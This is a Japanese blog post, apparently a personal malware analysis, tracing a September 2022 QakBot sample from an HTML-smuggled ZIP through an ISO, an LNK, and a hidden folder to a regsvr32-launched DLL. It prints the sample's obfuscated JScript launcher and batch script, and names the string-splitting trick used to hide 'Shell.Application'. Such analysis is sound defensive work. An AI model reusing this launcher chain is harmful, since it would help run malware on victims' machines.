# QakBotを見てみる part2

何となくtwitterを見てたら、以下のように出てました。  

> #Qakbot is back after a short summer break
元ツイート： https://twitter.com/Max_Mal_/status/1569272800690700291

まず、Qakbotが夏休みから帰ってきたというのが少し面白かったのですが、そもそも確かに最近QakBotの名前また聞き始めたな、てのを今更気づきました。  
Note:　これ調べてるのは9/15です

で、見てみたら確かに9月以降から増えてます。  

![stats4qakbot](https://raw.githubusercontent.com/proshiba/analysis/main/QakBot/QakBot20220915/images/stats.png)
引用元： https://bazaar.abuse.ch/browse/tag/Quakbot/

なんですかね？攻撃者も夏休みを取るのかなぁ。ランサムウェアチームとかもそうですしね。。  
※余談ですが、今はLockBitのリークサイト掲載が異常に増えてますね。。心配になります

ということで、QakBotが増えてるならちょっと見てみたいな、という気持ちで少し確認してみました。  

### 調査開始！

まず、malwarebazaarにあった以下ファイルで調査をします。  
sha256: 24de45cc2be1db49390912f26adebbf9d8740808f5fb6306e9dbf8d9aa9c5d46

これをダウンロードして、中身を見てみますとまずは、htmlファイルになっています。前と同じですね。  

![html](https://raw.githubusercontent.com/proshiba/analysis/main/QakBot/QakBot20220915/images/html-file01.png)

まずは、このファイルの中身を見てみます。そうするとzipファイルの埋め込みがされているようですね、これも同じです。  

![html](https://raw.githubusercontent.com/proshiba/analysis/main/QakBot/QakBot20220915/images/html-file02.png)

ちなみにhtmlをブラウザで開くと以下みたいな感じです。  

![html](https://raw.githubusercontent.com/proshiba/analysis/main/QakBot/QakBot20220915/images/html-file03.png)

さあ、ZIPファイルを開いてみてみましょう。そうするとISOファイルが入っています。  
これをさらに見てみますと、lnkファイルと隠しフォルダが存在していました。  

![iso01](https://raw.githubusercontent.com/proshiba/analysis/main/QakBot/QakBot20220915/images/iso-file01.png)

lnkファイルはお馴染みのexplorerアイコンですね。これは間違いなく存在するプロセスですからね。  
さらに、lnkのつながっている先は隠しフォルダ内にある`youBe.js`というファイルです。

では、この隠しフォルダ`about`の中を見てみましょう。そうするとjsファイル以外にbatとdbファイルがあるようです。

![iso02](https://raw.githubusercontent.com/proshiba/analysis/main/QakBot/QakBot20220915/images/iso-file02.png)

さぁ次はjavascriptファイルですね。  

```js
/**
	{comment}
*/

function sh(str1)
{
	return(WScript.createObject("she" + str1 + "lication"));
}

var shell = sh("ll[.]app");
shell.shellexecute("about\\becauseTo[.]bat", "reg svr", "", "open", 0);
```
Note: 一応ドットだけdefangしました

めちゃくちゃ簡単なobfuscationですね。実際やりたいことは以下のコマンドですが、それを関数使って文字列結合することで見づらくしてます。

```js
"shell[.]application".shellexecute("about\\becauseTO[.]bat", "regsvr", "", "open", 0)
```
Note: 同上

次に、batファイルを見てみます。

```bat
@echo off
%1%232 about/itThis.db
exit
```

%1と%2は渡した引数のことですので、それぞれ以下になっています。  
1. %1 -> regsvr
2. %2 -> "" #空白

つまり、以下のコマンドを実行してます。  

`regsvr32 about/itThis.db`

まぁ、よくあるregsvr32の悪用ですね。そしてここからわかることは`itThis.db`というファイルはDLLと思われます。(まぁocxなど別のライブラリ系もあり得ますが)  

では、virustotalの結果を見てみましょう。  

![vt-file01](https://raw.githubusercontent.com/proshiba/analysis/main/QakBot/QakBot20220915/images/vt-file01.png)  
https://www.virustotal.com/gui/file/1cbd5c3072fd99bff1408bc1f8a3b09206322de8b83b743a57efa24adefdb44f

virustotalで見ることができるサンドボックス実行結果などはそこまで説明するような情報もなかったので割愛します。  

### 終わりに

見る限り、特別目新しいことはなかったですね。まぁDLLの方が見れてないですが。  
やっぱりバイナリ解析までできるようになった方がいいなぁ、というのをヒシヒシと感じてますので、今は勉強中です。そのうち上げます。

とりあえず、少しでも皆さんのお力になれれば幸いです。  
ありがとうございました！
